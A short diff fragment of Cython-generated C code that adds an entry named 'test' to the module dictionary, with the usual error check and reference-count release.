+  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_9) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
+  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
 
   /*--- Wrapped vars code ---*/
 
